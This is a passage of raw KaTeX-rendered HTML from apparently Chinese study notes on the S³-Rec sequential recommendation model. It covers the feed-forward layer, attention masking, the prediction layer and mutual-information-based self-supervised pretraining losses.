style=\"margin-right:0.01968em;\">l</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">⊤</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mpunct\">,</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">N</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">U</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>W</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">W_1,b_1,W_2,b_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 都是可训练参数</li>\n<li>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>R</mi><mi>e</mi><mi>L</mi><mi>U</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">ReLU(x)=max(0,x)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">x</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></span></p>\n</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>F</mi><mi>F</mi><mi>N</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mi>x</mi><msub><mi>W</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><msub><mi>W</mi><mn>2</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">FFN(x)=max(0,xW_1+b_1)W_2+b_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">x</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></li>\n</ul>\n</li>\n<li>\n<p>在序列推荐中，只能利用当前时间步骤之前的信息，故对多头自注意力函数的输出应用掩码操作，以删除<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>Q</mi><mi>i</mi></msub><mtext>和</mtext><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">Q_i和K_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">Q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">和</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 之间的所有连接。</p>\n</li>\n<li>\n<p>在预训练阶段删除所有掩码机制，以获取项目序列中每个项目的双向上下文感知表示。</p>\n</li>\n</ul>\n<h3 id=\"预测层\"><a class=\"anchor\" href=\"#预测层\">#</a> 预测层</h3>\n<ul>\n<li>在<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>S</mi><mi>e</mi></msup><mo>−</mo><mi>R</mi><mi>e</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">S^e-Rec</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">e</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span></span></span></span> 最后一层根据用户历史上下文来计算用户在步骤<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">t+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69841em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 时对项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的偏好分数<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>i</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>i</mi><mi mathvariant=\"normal\">∣</mi><msub><mi>i</mi><mrow><mn>1</mn><mo>:</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo>=</mo><msubsup><mi mathvariant=\"bold\">e</mi><mi>i</mi><mi mathvariant=\"normal\">⊤</mi></msubsup><mo>⋅</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mi>L</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">P(i_{t+1}=i|i_{1:t})=\\mathbf{e}_i^\\top\\cdot\\mathbf{F}_t^L\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mrel mtight\">:</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.146108em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">e</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999998em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">⊤</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.138331em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">L</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<img data-src=\"https://s2.loli.net/2024/07/30/KZv2LMpOskGanTo.png\" alt=\"image.png\" /></li>\n</ul>\n<h2 id=\"使用-mim-进行自监督学习\"><a class=\"anchor\" href=\"#使用-mim-进行自监督学习\">#</a> 使用 MIM 进行自监督学习</h2>\n<ul>\n<li>将额外的自监督信号与 MIM 结合起来，以增强输入数据的表示</li>\n<li>采用预训练的方式，根据多视角相关性构建不同的损失函数</li>\n</ul>\n<h3 id=\"属性相关性建模\"><a class=\"anchor\" href=\"#属性相关性建模\">#</a> 属性相关性建模</h3>\n<ul>\n<li>\n<p>最大化项目和属性之间的相互信息。</p>\n</li>\n<li>\n<p>通过建模项目属性相关性来融合项目和属性级别的信息</p>\n</li>\n<li>\n<p>将有用的属性信息注入到项目表示中</p>\n</li>\n<li a_1,...,a_k\\=\"\">\n<p>给定项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 和属性集\\mathcal A_i=\\</p>\n</li>\n<li>\n<p>令<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">e_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示嵌入层获得的项目嵌入，并且令<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>e</mi><mrow><mi>a</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">e_{aj}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">a</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>j</mi></mrow><annotation encoding=\"application/x-tex\">j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span></span></span></span> 个属性<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><mo>∈</mo><msub><mi mathvariant=\"script\">A</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">a_j \\in \\mathcal A_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8252079999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的嵌入</p>\n</li>\n<li>\n<p>我们通过以下方式最小化关联属性预测（AAP）损失：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" 